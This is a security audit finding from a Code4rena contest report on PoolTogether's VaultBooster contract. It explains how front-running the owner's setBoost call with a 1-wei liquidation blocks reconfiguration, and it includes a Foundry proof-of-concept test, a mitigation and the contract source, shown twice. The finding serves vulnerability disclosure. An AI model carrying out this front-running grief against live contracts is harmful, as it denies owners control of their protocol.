{
  "Title": "[M-08] An attacker can preemptively block the configuration of boost values or the liquidation pair in `VaultBooster` through front-running",
  "Content": "\n<https://github.com/GenerationSoftware/pt-v5-vault-boost/blob/9d640051ab61a0fdbcc9500814b7f8242db9aec2/src/VaultBooster.sol#L142-L165><br>\n<https://github.com/GenerationSoftware/pt-v5-vault-boost/blob/9d640051ab61a0fdbcc9500814b7f8242db9aec2/src/VaultBooster.sol#L211-L237>\n\n### Impact\n\n*   This issue is related to the `setBoost()` function in `VaultBooster`, which allows the owner to configure boost parameters for a specific token (`tokenOut`).\n*   The function includes a check on `_initialAvailable` to ensure it does not exceed the contract's balance.\n\n```solidity\nif (_initialAvailable > 0) {\n      uint256 balance = _token.balanceOf(address(this));\n      if (balance < _initialAvailable) {\n        revert InitialAvailableExceedsBalance(_initialAvailable, balance);\n}\n```\n\n*   However, an attacker can front-run the owner's transaction and call `liquidate()` through the Liquidation Pair contract, reducing the contract's balance. As a result, the owner's transaction will revert, preventing the update of the liquidation pair and other boost parameters.\n*   To initiate this attack, the attacker does not need a large amount of tokens. Even a liquidation amount as small as `1 wei` is sufficient to prevent the owner from configuring the boost parameters for as long as needed. This allows the attacker to maintain control and hinder the owner's ability to update the boost settings.\n*   The inability to change the values such as `_multiplierOfTotalSupplyPerSecond` and `_tokensPerSecond` when needed could lead to suboptimal boost strategies, inefficiencies, and missed opportunities for the associated prize vault. Flexibility in adjusting these parameters is crucial for adapting to changing market conditions and maintaining competitiveness in the dynamic DeFi ecosystem.\n\n### Proof of Concept\n\nAssembling this PoC will take a little work as the standard tests used only mock addresses instead of actual contracts.\n\n*   Create a folder  `/2023-08-pooltogether/pt-v5-vault-boost/test/PoC`\n*   Add the following code to `/2023-08-pooltogether/pt-v5-vault-boost/test/PoC/MockERC20.sol`\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.19;\n\nimport \"openzeppelin/token/ERC20/ERC20.sol\";\n\ncontract MockERC20 is ERC20 {\n  constructor(string memory _name, string memory _symbol) ERC20(_name, _symbol) {}\n\n  function mint(address to, uint256 amount) public {\n    _mint(to, amount);\n  }\n}\n```\n\n*   Copy `/2023-08-pooltogether/pt-v5-cgda-liquidator/src/libraries/ContinuousGDA.sol` to `/2023-08-pooltogether/pt-v5-vault-boost/test/PoC/ContinuousGDA.sol`\n*   Copy `/2023-08-pooltogether/pt-v5-cgda-liquidator/src/LiquidationPair.sol` to `/2023-08-pooltogether/pt-v5-vault-boost/test/PoC/LiquidationPair.sol`\n*   Edit the import of ContinuosGDA at line 8 in `LiquidationPair.sol` as follows:\n\n```solidity\nimport { ContinuousGDA } from \"./ContinuousGDA.sol\";\n```\n\n*   Add the following code to `/2023-08-pooltogether/pt-v5-vault-boost/test/PoC/PoC.t.sol`\n\n```solidity\n// SPDX-License-Identifier: GPL-3.0\npragma solidity 0.8.19;\n\nimport \"forge-std/Test.sol\";\nimport \"forge-std/console.sol\";\n\nimport \"./MockERC20.sol\";\nimport \"./LiquidationPair.sol\";\n\nimport { SD1x18, unwrap, UNIT, sd1x18 } from \"prb-math/SD1x18.sol\";\nimport { UD2x18, ud2x18 } from \"prb-math/UD2x18.sol\";\n\nimport { VaultBooster, Boost, UD60x18, UD2x18, InitialAvailableExceedsBalance, OnlyLiquidationPair, UnsupportedTokenIn, InsufficientAvailableBalance } from \"../../src/VaultBooster.sol\";\nimport { PrizePool, TwabController, ConstructorParams, IERC20 } from \"pt-v5-prize-pool/PrizePool.sol\";\n\ncontract PoC is Test {\n\n  // Tons of params required to setup the whole PoolTogether system\n\n  ConstructorParams params;\n  VaultBooster booster;\n  LiquidationPair liquidationPair;\n  ILiquidationSource source;\n  TwabController twabController;\n  PrizePool prizePool;\n  MockERC20 boostToken;\n  MockERC20 prizeToken;\n\n  address vault;\n  SD59x18 decayConstant = wrap(0.001e18);\n  uint32 periodLength = 1 days;\n  uint32 periodOffset = 1 days;\n  uint32 targetFirstSaleTime = 12 hours;\n  uint112 initialAmountIn = 1e18;\n  uint112 initialAmountOut = 1e18;\n  uint256 minimumAuctionAmount = 0;\n  uint32 drawPeriodSeconds = 1 days;\n  uint64 lastClosedDrawStartedAt = uint64(block.timestamp + 1 days);\n  uint8 initialNumberOfTiers = 3;\n  address drawManager = address(this);\n\n  function setUp() public {\n    //TokenIn\n    prizeToken = new MockERC20(\"PrizeToken\", \"PT\");\n\n    //TokenOut\n    boostToken = new MockERC20(\"BoostToken\", \"BT\");\n\n    //TwabController\n    twabController = new TwabController(drawPeriodSeconds, uint32(block.timestamp));\n\n    //Prize Vault\n    vault = makeAddr(\"vault\");\n\n    //Prize Pool\n    params = ConstructorParams(\n      IERC20(address(prizeToken)),\n      twabController,\n      drawManager,\n      drawPeriodSeconds,\n      lastClosedDrawStartedAt,\n      initialNumberOfTiers,\n      100,\n      10,\n      10,\n      ud2x18(0.9e18),\n      sd1x18(0.9e18)\n    );\n    prizePool = new PrizePool(params);\n\n    //Vault Booster\n    booster = new VaultBooster(prizePool, vault, address(this));\n\n    //Liquidation Pair\n    source = ILiquidationSource(address(booster));\n    liquidationPair = new LiquidationPair(\n      source,\n      address(prizeToken),\n      address(boostToken),\n      periodLength,\n      periodOffset,\n      targetFirstSaleTime,\n      decayConstant,\n      initialAmountIn,\n      initialAmountIn,\n      minimumAuctionAmount\n    );\n  }\n\n  function testFrontRun() public {\n    vm.warp(0);\n\n    //Minting 1e18 Boost Tokens to the Booster\n    boostToken.mint(address(booster), 1e18);\n\n    //Setting up the Booster to allow liquidation for Boost Token\n    booster.setBoost(boostToken, address(liquidationPair), UD2x18.wrap(0.001e18), 0.03e18, 1e18);\n\n    //Ensuring VaultBooster is properly configured\n    Boost memory boost = booster.getBoost(boostToken);\n    assertEq(boost.available, 1e18);\n\n    vm.warp(10);\n\n    //Now the Vault Booster's owner decides to update the boost values by calling `setBoost`\n    //But attacker front-runs it by doing the following two steps in a single transaction\n\n    //1. Attacker sends 100 wei Prize Tokens to Prize Pool\n    prizeToken.mint(address(prizePool), 100);\n    //2. Attacker calls the liquidation Pair to liquidate 100 wei of Boost Tokens for 100 wei of Prize Tokens in Vault Booster\n    vm.prank(address(liquidationPair));\n    booster.liquidate(address(this), address(prizeToken), 100, address(boostToken), 100);\n\n    //The transcation to update the boost will revert as `_initialAvailable < balance` due to liquidation of tokens\n    vm.expectRevert();\n    booster.setBoost(boostToken, address(liquidationPair), UD2x18.wrap(0.002e18), 0.03e18, 1e18);\n  }\n}\n```\n\n*   Run the following command in `/2023-08-pooltogether/pt-v5-vault-boost/`:\n\n```bash\nforge test --mc \"PoC\" -vvvv\n```\n\n### Recommended Mitigation Steps\n\n*   Add a pausing functionality on liquidation to allow Vault Booster's owners to update the boost values.\n\n**[hickuphh3 (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-08-pooltogether-findings/issues/60#issuecomment-1676627532):**\n > Valid griefing concern.\n\n**[asselstine (PoolTogether) acknowledged](https://github.com/code-423n4/2023-08-pooltogether-findings/issues/60#issuecomment-1709236731)**\n\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/reports/2023-08-pooltogether",
  "Code": [
    {
      "filename": "src/VaultBooster.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity ^0.8.0;\n\nimport \"forge-std/console2.sol\";\n\nimport { ILiquidationSource } from \"pt-v5-liquidator-interfaces/interfaces/ILiquidationSource.sol\";\nimport { PrizePool, IERC20, TwabController } from \"pt-v5-prize-pool/PrizePool.sol\";\nimport { UD60x18, convert } from \"prb-math/UD60x18.sol\";\nimport { UD2x18, intoUD60x18 } from \"prb-math/UD2x18.sol\";\nimport { Ownable } from \"openzeppelin/access/Ownable.sol\";\nimport { SafeERC20 } from \"openzeppelin/token/ERC20/utils/SafeERC20.sol\";\nimport { SafeCast } from \"openzeppelin/utils/math/SafeCast.sol\";\n\n/// @notice Emitted when someone tries to call liquidate and isn't the liquidation pair\nerror OnlyLiquidationPair();\n\n/// @notice Emitted when the initial available exceeds the balance\n/// @param initialAvailable The initial available\n/// @param balance The actual token balance\nerror InitialAvailableExceedsBalance(uint144 initialAvailable, uint256 balance);\n\n/// @notice Emitted when the liquidator attempts to liquidate more than the available balance\nerror InsufficientAvailableBalance(uint256 amountOut, uint256 available);\n\n/// @notice Emitted when the liquidator attempts to liquidate for a token other than the prize token \nerror UnsupportedTokenIn();\n\n/// @notice Struct that holds the boost data\nstruct Boost {\n  address liquidationPair;\n  UD2x18 multiplierOfTotalSupplyPerSecond;\n  uint96 tokensPerSecond;\n  uint144 available;\n  uint48 lastAccruedAt;\n}\n\n/// @title VaultBooster\n/// @author G9 Software Inc.\n/// @notice Allows someone to liquidate arbitrary tokens for a vault and improve the vault's chance of winning\ncontract VaultBooster is Ownable, ILiquidationSource {\n  using SafeERC20 for IERC20;\n  using SafeCast for uint256;\n\n  /// @notice Emitted when a boost is set\n  /// @param token The token to liquidate to boost the Vault's chances\n  /// @param liquidationPair The pair that will act as the liquidator\n  /// @param multiplierOfTotalSupplyPerSecond The multiplier of the total supply per second. Can be used to simulate APR. Can be combined with tokensPerSecond\n  /// @param tokensPerSecond The number of tokens to accrue per second. Is a simple straight time*amount allocation. Can be combiend with the multiplier.\n  /// @param initialAvailable The initial available balance\n  /// @param lastAccruedAt The timestamp at which the boost was set\n  event SetBoost(\n    IERC20 indexed token,\n    address liquidationPair,\n    UD2x18 multiplierOfTotalSupplyPerSecond,\n    uint96 tokensPerSecond,\n    uint144 initialAvailable,\n    uint48 lastAccruedAt\n  );\n\n  /// @notice Emitted when someone deposits tokens\n  /// @param token The token that they deposited\n  /// @param from The account that deposited the tokens\n  /// @param amount The amount that was deposited.\n  event Deposited(\n    IERC20 indexed token,\n    address indexed from,\n    uint256 amount\n  );\n\n  /// @notice Emitted when tokens are withdrawn by the owner\n  /// @param token The token that was withdrawn\n  /// @param from The account that withdraw the tokens\n  /// @param amount The amount of tokens that were withdrawn\n  event Withdrawn(\n    IERC20 indexed token,\n    address indexed from,\n    uint256 amount\n  );\n\n  /// @notice Emitted when tokens are liquidated\n  /// @param token The token that was sold\n  /// @param from The account that is receiving the tokens\n  /// @param amountIn The amount of tokens that were contributed to the prize pool\n  /// @param amountOut The amount of tokens that were sold\n  /// @param availableBoostBalance The remaining available boost balance for the token\n  event Liquidated(\n    IERC20 indexed token,\n    address indexed from,\n    uint256 amountIn,\n    uint256 amountOut,\n    uint256 availableBoostBalance\n  );\n\n  /// @notice Emitted when boost tokens are accrued\n  /// @param token The token that accrued\n  /// @param availableBoostBalance The new available balance\n  event BoostAccrued(\n    IERC20 indexed token,\n    uint256 availableBoostBalance\n  );\n\n  /// @notice The prize pool that this booster will contribute to\n  PrizePool public immutable prizePool;\n\n  /// @notice The prize pool's twab controller; copied here to save gas\n  TwabController public immutable twabController;\n  \n  /// @notice The vault that the VaultBooster is boosting\n  address public immutable vault;\n\n  /// @notice The boosts that have been set\n  mapping(IERC20 => Boost) internal _boosts;\n\n  /// @notice Constructs a new VaultBooster\n  /// @param _prizePool The prize pool to contribute to\n  /// @param _vault The vault to boost\n  /// @param _owner The owner of the VaultBooster contract\n  constructor(\n    PrizePool _prizePool,\n    address _vault,\n    address _owner\n  ) Ownable(_owner) {\n    prizePool = _prizePool;\n    twabController = prizePool.twabController();\n    vault = _vault;\n  }\n\n  /// @notice Retrieves boost details for a token\n  /// @param _token The token whose boost details to retrieve\n  /// @return The boost details\n  function getBoost(IERC20 _token) external returns (Boost memory) {\n    _accrue(_token);\n    return _boosts[_token];\n  }\n\n  /// @notice Allows the owner to configure a boost for a token\n  /// @param _token The token that will be liquidated to boost the chances of the vault\n  /// @param _liquidationPair The liquidation pair that will facilitate liquidations\n  /// @param _multiplierOfTotalSupplyPerSecond The multiplier of the total supply per second, useful for simulating APR. Can be combined with tokensPerSecond.\n  /// @param _tokensPerSecond A simple tokensPerSecond*deltaTime accumulator. Can be combined with the multiplier.\n  /// @param _initialAvailable The initial available balance. Must be less than or equal to the current balance of the VaultBooster of the given token.\n  function setBoost(IERC20 _token, address _liquidationPair, UD2x18 _multiplierOfTotalSupplyPerSecond, uint96 _tokensPerSecond, uint144 _initialAvailable) external onlyOwner {\n    if (_initialAvailable > 0) {\n      uint256 balance = _token.balanceOf(address(this));\n      if (balance < _initialAvailable) {\n        revert InitialAvailableExceedsBalance(_initialAvailable, balance);\n      }\n    }\n    _boosts[_token] = Boost({\n      liquidationPair: _liquidationPair,\n      multiplierOfTotalSupplyPerSecond: _multiplierOfTotalSupplyPerSecond,\n      tokensPerSecond: _tokensPerSecond,\n      available: _initialAvailable,\n      lastAccruedAt: uint48(block.timestamp)\n    });\n\n    emit SetBoost(\n      _token,\n      _liquidationPair,\n      _multiplierOfTotalSupplyPerSecond,\n      _tokensPerSecond,\n      _initialAvailable,\n      uint48(block.timestamp)\n    );\n  }\n\n  /// @notice Deposits tokens into this contract. \n  /// @dev Useful because it ensures `accrue` is called before depositing\n  /// @param _token The token to deposit\n  /// @param _amount The amount to deposit\n  function deposit(IERC20 _token, uint256 _amount) external {\n    _accrue(_token);\n    _token.safeTransferFrom(msg.sender, address(this), _amount);\n\n    emit Deposited(_token, msg.sender, _amount);\n  }\n\n  /// @notice Accrues the boost for the given token\n  /// @param _token The token whose boost should be updated\n  /// @return The new available balance of the boost\n  function accrue(IERC20 _token) external returns (uint256) {\n    return _accrue(_token);\n  }\n\n  /// @notice allows the owner to withdraw tokens\n  /// @param _token The token to withdraw\n  /// @param _amount The amount of tokens to withdraw\n  function withdraw(IERC20 _token, uint256 _amount) external onlyOwner {\n    uint256 availableBoost = _accrue(_token);\n    uint256 availableBalance = _token.balanceOf(address(this));\n    uint256 remainingBalance = availableBalance - _amount;\n    _boosts[IERC20(_token)].available = (availableBoost > remainingBalance ? remainingBalance : availableBoost).toUint144();\n    _token.transfer(msg.sender, _amount);\n\n    emit Withdrawn(_token, msg.sender, _amount);\n  }\n\n  /// @notice Returns the available amount of tokens for a boost\n  /// @param _tokenOut The token whose boost should be checked\n  /// @return The available amount boost tokens\n  function liquidatableBalanceOf(address _tokenOut) external override returns (uint256) {\n    return _accrue(IERC20(_tokenOut));\n  }\n\n  /// @notice Allows the liquidation pair to liquidate tokens\n  /// @param _account The account that will receive the liquidated tokens\n  /// @param _tokenIn The tokens that will be contributed to the prize pool. Must be the prize token\n  /// @param _amountIn The amount of tokens to contribute to the prize pool\n  /// @param _tokenOut The tokens that are being liquidated\n  /// @param _amountOut The amount of tokens to liquidate\n  function liquidate(\n    address _account,\n    address _tokenIn,\n    uint256 _amountIn,\n    address _tokenOut,\n    uint256 _amountOut\n  ) external override onlyPrizeToken(_tokenIn) onlyLiquidationPair(_tokenOut) returns (bool) {\n    uint256 amountAvailable = _computeAvailable(IERC20(_tokenOut));\n    if (_amountOut > amountAvailable) {\n      revert InsufficientAvailableBalance(_amountOut, amountAvailable);\n    }\n    amountAvailable = (amountAvailable - _amountOut);\n    _boosts[IERC20(_tokenOut)].available = amountAvailable.toUint144();\n    _boosts[IERC20(_tokenOut)].lastAccruedAt = uint48(block.timestamp);\n    prizePool.contributePrizeTokens(vault, _amountIn);\n    IERC20(_tokenOut).safeTransfer(_account, _amountOut);\n\n    emit Liquidated(\n      IERC20(_tokenOut),\n      _account,\n      _amountIn,\n      _amountOut,\n      amountAvailable\n    );\n\n    return true;\n  }\n\n  /// @notice Returns the liquidation target for the given input tokens. Input must be the prize token, and it always returns the prize pool.\n  /// @param _tokenIn The token that will be received. Revert if it isn't the prize token.\n  /// @return The address of the prize pool\n  function targetOf(address _tokenIn) external view override onlyPrizeToken(_tokenIn) returns (address) {\n    return address(prizePool);\n  }\n\n  /// @notice Accrues boost tokens\n  /// @param _tokenOut The token whose boost should be accrued\n  /// @return The new available balance of the boost\n  function _accrue(IERC20 _tokenOut) internal returns (uint256) {\n    uint256 available = _computeAvailable(_tokenOut);\n    _boosts[_tokenOut].available = available.toUint144();\n    _boosts[_tokenOut].lastAccruedAt = uint48(block.timestamp);\n\n    emit BoostAccrued(_tokenOut, available);\n\n    return available;\n  }\n\n  /// @notice Computes the available balance of the boost\n  /// @param _tokenOut The token whose boost should be computed\n  /// @return The new available balance\n  function _computeAvailable(IERC20 _tokenOut) internal view returns (uint256) {\n    Boost memory boost = _boosts[_tokenOut];\n    uint256 deltaTime = block.timestamp - boost.lastAccruedAt;\n    uint256 deltaAmount;\n    if (deltaTime == 0) {\n      return boost.available;\n    }\n    if (boost.tokensPerSecond > 0) {\n      deltaAmount = boost.tokensPerSecond * deltaTime;\n    }\n    if (boost.multiplierOfTotalSupplyPerSecond.unwrap() > 0) {\n      uint256 totalSupply = twabController.getTotalSupplyTwabBetween(address(vault), uint32(boost.lastAccruedAt), uint32(block.timestamp));\n      deltaAmount += convert(boost.multiplierOfTotalSupplyPerSecond.intoUD60x18().mul(convert(deltaTime)).mul(convert(totalSupply)));\n    }\n    uint256 availableBalance = _tokenOut.balanceOf(address(this));\n    deltaAmount = availableBalance > deltaAmount ? deltaAmount : availableBalance;\n    return boost.available + deltaAmount;\n  }\n\n  /// @notice Requires the given token to be the prize token\n  /// @param _tokenIn The token to be checked as the prize token\n  modifier onlyPrizeToken(address _tokenIn) {\n    if (IERC20(_tokenIn) != prizePool.prizeToken()) {\n      revert UnsupportedTokenIn();\n    }\n    _;\n  }\n\n  /// @notice Ensures that the caller is the liquidation pair for the given token\n  /// @param _token The token whose boost's liquidation pair must be the caller\n  modifier onlyLiquidationPair(address _token) {\n    if (_boosts[IERC20(_token)].liquidationPair != msg.sender) {\n      revert OnlyLiquidationPair();\n    }\n    _;\n  }\n\n}"
    },
    {
      "filename": "src/VaultBooster.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity ^0.8.0;\n\nimport \"forge-std/console2.sol\";\n\nimport { ILiquidationSource } from \"pt-v5-liquidator-interfaces/interfaces/ILiquidationSource.sol\";\nimport { PrizePool, IERC20, TwabController } from \"pt-v5-prize-pool/PrizePool.sol\";\nimport { UD60x18, convert } from \"prb-math/UD60x18.sol\";\nimport { UD2x18, intoUD60x18 } from \"prb-math/UD2x18.sol\";\nimport { Ownable } from \"openzeppelin/access/Ownable.sol\";\nimport { SafeERC20 } from \"openzeppelin/token/ERC20/utils/SafeERC20.sol\";\nimport { SafeCast } from \"openzeppelin/utils/math/SafeCast.sol\";\n\n/// @notice Emitted when someone tries to call liquidate and isn't the liquidation pair\nerror OnlyLiquidationPair();\n\n/// @notice Emitted when the initial available exceeds the balance\n/// @param initialAvailable The initial available\n/// @param balance The actual token balance\nerror InitialAvailableExceedsBalance(uint144 initialAvailable, uint256 balance);\n\n/// @notice Emitted when the liquidator attempts to liquidate more than the available balance\nerror InsufficientAvailableBalance(uint256 amountOut, uint256 available);\n\n/// @notice Emitted when the liquidator attempts to liquidate for a token other than the prize token \nerror UnsupportedTokenIn();\n\n/// @notice Struct that holds the boost data\nstruct Boost {\n  address liquidationPair;\n  UD2x18 multiplierOfTotalSupplyPerSecond;\n  uint96 tokensPerSecond;\n  uint144 available;\n  uint48 lastAccruedAt;\n}\n\n/// @title VaultBooster\n/// @author G9 Software Inc.\n/// @notice Allows someone to liquidate arbitrary tokens for a vault and improve the vault's chance of winning\ncontract VaultBooster is Ownable, ILiquidationSource {\n  using SafeERC20 for IERC20;\n  using SafeCast for uint256;\n\n  /// @notice Emitted when a boost is set\n  /// @param token The token to liquidate to boost the Vault's chances\n  /// @param liquidationPair The pair that will act as the liquidator\n  /// @param multiplierOfTotalSupplyPerSecond The multiplier of the total supply per second. Can be used to simulate APR. Can be combined with tokensPerSecond\n  /// @param tokensPerSecond The number of tokens to accrue per second. Is a simple straight time*amount allocation. Can be combiend with the multiplier.\n  /// @param initialAvailable The initial available balance\n  /// @param lastAccruedAt The timestamp at which the boost was set\n  event SetBoost(\n    IERC20 indexed token,\n    address liquidationPair,\n    UD2x18 multiplierOfTotalSupplyPerSecond,\n    uint96 tokensPerSecond,\n    uint144 initialAvailable,\n    uint48 lastAccruedAt\n  );\n\n  /// @notice Emitted when someone deposits tokens\n  /// @param token The token that they deposited\n  /// @param from The account that deposited the tokens\n  /// @param amount The amount that was deposited.\n  event Deposited(\n    IERC20 indexed token,\n    address indexed from,\n    uint256 amount\n  );\n\n  /// @notice Emitted when tokens are withdrawn by the owner\n  /// @param token The token that was withdrawn\n  /// @param from The account that withdraw the tokens\n  /// @param amount The amount of tokens that were withdrawn\n  event Withdrawn(\n    IERC20 indexed token,\n    address indexed from,\n    uint256 amount\n  );\n\n  /// @notice Emitted when tokens are liquidated\n  /// @param token The token that was sold\n  /// @param from The account that is receiving the tokens\n  /// @param amountIn The amount of tokens that were contributed to the prize pool\n  /// @param amountOut The amount of tokens that were sold\n  /// @param availableBoostBalance The remaining available boost balance for the token\n  event Liquidated(\n    IERC20 indexed token,\n    address indexed from,\n    uint256 amountIn,\n    uint256 amountOut,\n    uint256 availableBoostBalance\n  );\n\n  /// @notice Emitted when boost tokens are accrued\n  /// @param token The token that accrued\n  /// @param availableBoostBalance The new available balance\n  event BoostAccrued(\n    IERC20 indexed token,\n    uint256 availableBoostBalance\n  );\n\n  /// @notice The prize pool that this booster will contribute to\n  PrizePool public immutable prizePool;\n\n  /// @notice The prize pool's twab controller; copied here to save gas\n  TwabController public immutable twabController;\n  \n  /// @notice The vault that the VaultBooster is boosting\n  address public immutable vault;\n\n  /// @notice The boosts that have been set\n  mapping(IERC20 => Boost) internal _boosts;\n\n  /// @notice Constructs a new VaultBooster\n  /// @param _prizePool The prize pool to contribute to\n  /// @param _vault The vault to boost\n  /// @param _owner The owner of the VaultBooster contract\n  constructor(\n    PrizePool _prizePool,\n    address _vault,\n    address _owner\n  ) Ownable(_owner) {\n    prizePool = _prizePool;\n    twabController = prizePool.twabController();\n    vault = _vault;\n  }\n\n  /// @notice Retrieves boost details for a token\n  /// @param _token The token whose boost details to retrieve\n  /// @return The boost details\n  function getBoost(IERC20 _token) external returns (Boost memory) {\n    _accrue(_token);\n    return _boosts[_token];\n  }\n\n  /// @notice Allows the owner to configure a boost for a token\n  /// @param _token The token that will be liquidated to boost the chances of the vault\n  /// @param _liquidationPair The liquidation pair that will facilitate liquidations\n  /// @param _multiplierOfTotalSupplyPerSecond The multiplier of the total supply per second, useful for simulating APR. Can be combined with tokensPerSecond.\n  /// @param _tokensPerSecond A simple tokensPerSecond*deltaTime accumulator. Can be combined with the multiplier.\n  /// @param _initialAvailable The initial available balance. Must be less than or equal to the current balance of the VaultBooster of the given token.\n  function setBoost(IERC20 _token, address _liquidationPair, UD2x18 _multiplierOfTotalSupplyPerSecond, uint96 _tokensPerSecond, uint144 _initialAvailable) external onlyOwner {\n    if (_initialAvailable > 0) {\n      uint256 balance = _token.balanceOf(address(this));\n      if (balance < _initialAvailable) {\n        revert InitialAvailableExceedsBalance(_initialAvailable, balance);\n      }\n    }\n    _boosts[_token] = Boost({\n      liquidationPair: _liquidationPair,\n      multiplierOfTotalSupplyPerSecond: _multiplierOfTotalSupplyPerSecond,\n      tokensPerSecond: _tokensPerSecond,\n      available: _initialAvailable,\n      lastAccruedAt: uint48(block.timestamp)\n    });\n\n    emit SetBoost(\n      _token,\n      _liquidationPair,\n      _multiplierOfTotalSupplyPerSecond,\n      _tokensPerSecond,\n      _initialAvailable,\n      uint48(block.timestamp)\n    );\n  }\n\n  /// @notice Deposits tokens into this contract. \n  /// @dev Useful because it ensures `accrue` is called before depositing\n  /// @param _token The token to deposit\n  /// @param _amount The amount to deposit\n  function deposit(IERC20 _token, uint256 _amount) external {\n    _accrue(_token);\n    _token.safeTransferFrom(msg.sender, address(this), _amount);\n\n    emit Deposited(_token, msg.sender, _amount);\n  }\n\n  /// @notice Accrues the boost for the given token\n  /// @param _token The token whose boost should be updated\n  /// @return The new available balance of the boost\n  function accrue(IERC20 _token) external returns (uint256) {\n    return _accrue(_token);\n  }\n\n  /// @notice allows the owner to withdraw tokens\n  /// @param _token The token to withdraw\n  /// @param _amount The amount of tokens to withdraw\n  function withdraw(IERC20 _token, uint256 _amount) external onlyOwner {\n    uint256 availableBoost = _accrue(_token);\n    uint256 availableBalance = _token.balanceOf(address(this));\n    uint256 remainingBalance = availableBalance - _amount;\n    _boosts[IERC20(_token)].available = (availableBoost > remainingBalance ? remainingBalance : availableBoost).toUint144();\n    _token.transfer(msg.sender, _amount);\n\n    emit Withdrawn(_token, msg.sender, _amount);\n  }\n\n  /// @notice Returns the available amount of tokens for a boost\n  /// @param _tokenOut The token whose boost should be checked\n  /// @return The available amount boost tokens\n  function liquidatableBalanceOf(address _tokenOut) external override returns (uint256) {\n    return _accrue(IERC20(_tokenOut));\n  }\n\n  /// @notice Allows the liquidation pair to liquidate tokens\n  /// @param _account The account that will receive the liquidated tokens\n  /// @param _tokenIn The tokens that will be contributed to the prize pool. Must be the prize token\n  /// @param _amountIn The amount of tokens to contribute to the prize pool\n  /// @param _tokenOut The tokens that are being liquidated\n  /// @param _amountOut The amount of tokens to liquidate\n  function liquidate(\n    address _account,\n    address _tokenIn,\n    uint256 _amountIn,\n    address _tokenOut,\n    uint256 _amountOut\n  ) external override onlyPrizeToken(_tokenIn) onlyLiquidationPair(_tokenOut) returns (bool) {\n    uint256 amountAvailable = _computeAvailable(IERC20(_tokenOut));\n    if (_amountOut > amountAvailable) {\n      revert InsufficientAvailableBalance(_amountOut, amountAvailable);\n    }\n    amountAvailable = (amountAvailable - _amountOut);\n    _boosts[IERC20(_tokenOut)].available = amountAvailable.toUint144();\n    _boosts[IERC20(_tokenOut)].lastAccruedAt = uint48(block.timestamp);\n    prizePool.contributePrizeTokens(vault, _amountIn);\n    IERC20(_tokenOut).safeTransfer(_account, _amountOut);\n\n    emit Liquidated(\n      IERC20(_tokenOut),\n      _account,\n      _amountIn,\n      _amountOut,\n      amountAvailable\n    );\n\n    return true;\n  }\n\n  /// @notice Returns the liquidation target for the given input tokens. Input must be the prize token, and it always returns the prize pool.\n  /// @param _tokenIn The token that will be received. Revert if it isn't the prize token.\n  /// @return The address of the prize pool\n  function targetOf(address _tokenIn) external view override onlyPrizeToken(_tokenIn) returns (address) {\n    return address(prizePool);\n  }\n\n  /// @notice Accrues boost tokens\n  /// @param _tokenOut The token whose boost should be accrued\n  /// @return The new available balance of the boost\n  function _accrue(IERC20 _tokenOut) internal returns (uint256) {\n    uint256 available = _computeAvailable(_tokenOut);\n    _boosts[_tokenOut].available = available.toUint144();\n    _boosts[_tokenOut].lastAccruedAt = uint48(block.timestamp);\n\n    emit BoostAccrued(_tokenOut, available);\n\n    return available;\n  }\n\n  /// @notice Computes the available balance of the boost\n  /// @param _tokenOut The token whose boost should be computed\n  /// @return The new available balance\n  function _computeAvailable(IERC20 _tokenOut) internal view returns (uint256) {\n    Boost memory boost = _boosts[_tokenOut];\n    uint256 deltaTime = block.timestamp - boost.lastAccruedAt;\n    uint256 deltaAmount;\n    if (deltaTime == 0) {\n      return boost.available;\n    }\n    if (boost.tokensPerSecond > 0) {\n      deltaAmount = boost.tokensPerSecond * deltaTime;\n    }\n    if (boost.multiplierOfTotalSupplyPerSecond.unwrap() > 0) {\n      uint256 totalSupply = twabController.getTotalSupplyTwabBetween(address(vault), uint32(boost.lastAccruedAt), uint32(block.timestamp));\n      deltaAmount += convert(boost.multiplierOfTotalSupplyPerSecond.intoUD60x18().mul(convert(deltaTime)).mul(convert(totalSupply)));\n    }\n    uint256 availableBalance = _tokenOut.balanceOf(address(this));\n    deltaAmount = availableBalance > deltaAmount ? deltaAmount : availableBalance;\n    return boost.available + deltaAmount;\n  }\n\n  /// @notice Requires the given token to be the prize token\n  /// @param _tokenIn The token to be checked as the prize token\n  modifier onlyPrizeToken(address _tokenIn) {\n    if (IERC20(_tokenIn) != prizePool.prizeToken()) {\n      revert UnsupportedTokenIn();\n    }\n    _;\n  }\n\n  /// @notice Ensures that the caller is the liquidation pair for the given token\n  /// @param _token The token whose boost's liquidation pair must be the caller\n  modifier onlyLiquidationPair(address _token) {\n    if (_boosts[IERC20(_token)].liquidationPair != msg.sender) {\n      revert OnlyLiquidationPair();\n    }\n    _;\n  }\n\n}"
    }
  ]
}